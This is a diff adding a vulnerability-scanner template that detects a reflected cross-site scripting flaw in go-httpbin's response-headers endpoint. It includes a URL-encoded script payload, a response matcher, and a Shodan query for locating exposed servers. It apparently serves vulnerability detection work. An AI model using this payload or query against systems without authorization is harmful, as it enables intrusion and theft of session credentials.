@@ -1,0 +1,41 @@
+id: httpbin-contenttype-xss
+
+info:
+  name: HTTPBin - Cross-Site Scripting
+  author: ayushxtha
+  severity: medium
+  description: |
+    HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  reference:
+    - https://github.com/mccutchen/go-httpbin/security/advisories/GHSA-528q-4pgm-wvg2
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+    shodan-query: html:"httpbingo.org"
+  tags: xss,httpbin,oss
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/response-headers?Content-Type=text/html&Server=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Server":'
+          - '"<script>alert(document.domain)</script>"'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
